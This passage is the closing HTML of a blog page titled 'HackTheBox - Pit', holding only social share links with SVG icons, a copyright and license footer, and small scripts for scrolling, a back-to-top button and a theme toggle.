25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Pit on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fpit%2f&title=HackTheBox%20-%20Pit&summary=HackTheBox%20-%20Pit&source=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fpit%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Pit on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fpit%2f&title=HackTheBox%20-%20Pit"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Pit on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fpit%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Pit on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Pit%20-%20https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fpit%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Pit on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Pit&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fpit%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>&nbsp;&&nbsp;<a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>&nbsp;(mod)</span>
<span><span class=copyright>&copy; 2022&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span>
&nbsp;·&nbsp;
<span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>